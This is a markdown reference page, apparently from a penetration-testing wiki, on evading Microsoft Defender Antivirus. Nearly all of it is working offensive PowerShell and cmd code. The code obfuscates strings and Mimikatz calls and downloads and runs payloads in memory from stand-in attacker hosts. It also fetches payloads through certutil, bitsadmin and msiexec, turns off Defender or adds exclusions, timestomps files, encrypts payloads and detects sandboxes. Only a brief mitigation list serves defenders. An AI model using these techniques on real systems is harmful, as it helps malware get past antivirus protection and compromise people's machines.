---
title: Windows Defender Evasion
category: techniques
tags: [evasion, defender, antivirus, bypass]
last_updated: 2025-12-27
---

# Windows Defender Evasion

## Windows Defender Components

Windows Defender (Microsoft Defender Antivirus) consists of multiple protection layers:

### Core Components

| Component | Description |
|-----------|-------------|
| Real-time Protection | Monitors file system and process activity |
| Cloud Protection | Uploads suspicious files for cloud analysis |
| Behavior Monitoring | Detects malicious behavior patterns |
| AMSI Integration | Scans scripts and fileless attacks |
| Controlled Folder Access | Ransomware protection |
| Network Protection | Blocks malicious network connections |
| Tamper Protection | Prevents security settings modification |

### Checking Defender Status

```powershell
# Get Defender status
Get-MpComputerStatus

# Check specific protections
Get-MpComputerStatus | Select-Object `
    RealTimeProtectionEnabled,
    BehaviorMonitorEnabled,
    IoavProtectionEnabled,
    AntispywareEnabled,
    AntivirusEnabled

# List exclusions
Get-MpPreference | Select-Object `
    ExclusionPath,
    ExclusionExtension,
    ExclusionProcess

# Check Defender service
Get-Service WinDefend
```

## Evasion Techniques

### 1. Signature Evasion

Modify payload to avoid static signature detection.

#### String Obfuscation

```powershell
# Original (detected)
$client = New-Object System.Net.WebClient
$client.DownloadString("http://malicious.com/payload.ps1")

# Obfuscated
$c = New-Object ('System.Net.We'+'bClient')
$c.('Downlo'+'adString').Invoke("http://malicious.com/payload.ps1")
```

#### Variable Substitution

```powershell
# Detected pattern
Invoke-Mimikatz

# Evasion via variable
$m = "Inv" + "oke-" + "Mim" + "ik" + "atz"
& (Get-Command $m)
```

#### Character Encoding

```powershell
# XOR encoding
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
IEX $decoded

# Custom XOR function
function XOR-Encode($str, $key) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($str)
    $encoded = @()
    for($i=0; $i -lt $bytes.Length; $i++) {
        $encoded += $bytes[$i] -bxor $key
    }
    return [System.Convert]::ToBase64String($encoded)
}
```

### 2. Obfuscation Techniques

#### PowerShell Obfuscation

```powershell
# Case randomization
iNvOkE-eXpReSsIoN (neW-oBjEcT Net.WebClient).downloadstring('http://attacker/p.ps1')

# Tick insertion
I`nv`oke-Exp`ress`ion

# Concatenation
& (('{2}{0}{1}' -f 'ke-Exp','ression','Invo') | ForEach-Object {$_})

# Using environment variables
& ($env:comspec[4,15,25] -join '') # Returns 'iex'
```

#### Invoke-Obfuscation Techniques

```powershell
# Token obfuscation
${e}=@();${e}+='Inv';${e}+='oke-';${e}+='Exp';${e}+='res';${e}+='sion';& (-join ${e})

# String manipulation
-join ([char[]]@(73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110))
```

### 3. In-Memory Execution

Avoid writing to disk to bypass file-based scanning.

#### PowerShell In-Memory Download

```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# Using Invoke-WebRequest
IEX (Invoke-WebRequest -Uri 'http://attacker/payload.ps1' -UseBasicParsing).Content
```

#### Reflective DLL Injection

```powershell
# Load assembly from byte array
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
```

#### Process Hollowing (Concept)

```
1. Create suspended process (legitimate binary)
2. Unmap original executable
3. Allocate memory in target process
4. Write malicious code
5. Set entry point
6. Resume thread
```

### 4. Living Off The Land (LOTL)

Use legitimate system tools to avoid detection.

#### PowerShell Alternatives

```cmd
# Using certutil for download
certutil -urlcache -split -f http://attacker/payload.exe %TEMP%\payload.exe

# Using bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/payload.exe %TEMP%\payload.exe

# Using curl (Windows 10+)
curl http://attacker/payload.exe -o %TEMP%\payload.exe
```

#### Code Execution Without PowerShell

```cmd
# WMIC
wmic process call create "notepad.exe"

# Using msiexec
msiexec /q /i http://attacker/payload.msi

# Using cscript/wscript
cscript //E:jscript payload.js
```

### 5. Disabling Defender (Requires Admin)

```powershell
# Disable real-time monitoring (requires admin + tamper protection off)
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".exe"

# Disable via service (may require tamper protection bypass)
Stop-Service WinDefend
Set-Service WinDefend -StartupType Disabled
```

**Note:** Tamper Protection prevents these changes in modern Windows.

### 6. Timestomping and Metadata

```powershell
# Change file timestamps to blend in
$file = Get-Item C:\Temp\payload.exe
$file.CreationTime = "01/01/2020 12:00:00"
$file.LastWriteTime = "01/01/2020 12:00:00"
$file.LastAccessTime = "01/01/2020 12:00:00"
```

### 7. Payload Encryption

```powershell
# AES encryption for payload delivery
function Encrypt-Payload {
    param($data, $key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32))
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    return [System.Convert]::ToBase64String($encrypted)
}

function Decrypt-Payload {
    param($data, $key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32))
    $aes.IV = New-Object byte[] 16
    $decryptor = $aes.CreateDecryptor()
    $bytes = [System.Convert]::FromBase64String($data)
    $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}
```

## Detection Avoidance Summary

| Technique | Bypasses | Risk Level |
|-----------|----------|------------|
| String obfuscation | Signatures | Low |
| In-memory execution | File scanning | Medium |
| LOTL binaries | Process monitoring | Medium |
| Payload encryption | Content inspection | Medium |
| Disable Defender | All | High (requires admin) |

## Testing Payloads

### Safe Testing Environment

```powershell
# Check if running in sandbox
$sandbox = @(
    "vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd",
    "df5serv", "vboxservice"
)
Get-Process | Where-Object {$sandbox -contains $_.Name}

# Check for analysis tools
$tools = @("wireshark", "procmon", "procexp", "fiddler", "ida64")
Get-Process | Where-Object {$tools -contains $_.Name}
```

### Defender Exclusion Testing

```powershell
# Create EICAR test file
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "C:\Temp\eicar.txt" -Value $eicar
```

## Mitigation for Defenders

1. **Enable Cloud Protection**: Improves detection of new threats
2. **Enable Tamper Protection**: Prevents Defender modification
3. **Block Office Macros**: Reduce initial access vectors
4. **Attack Surface Reduction Rules**: Block common attack techniques
5. **Script Block Logging**: Capture obfuscated scripts
6. **EDR Integration**: Behavioral detection beyond signatures

## References

- [Microsoft Defender Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
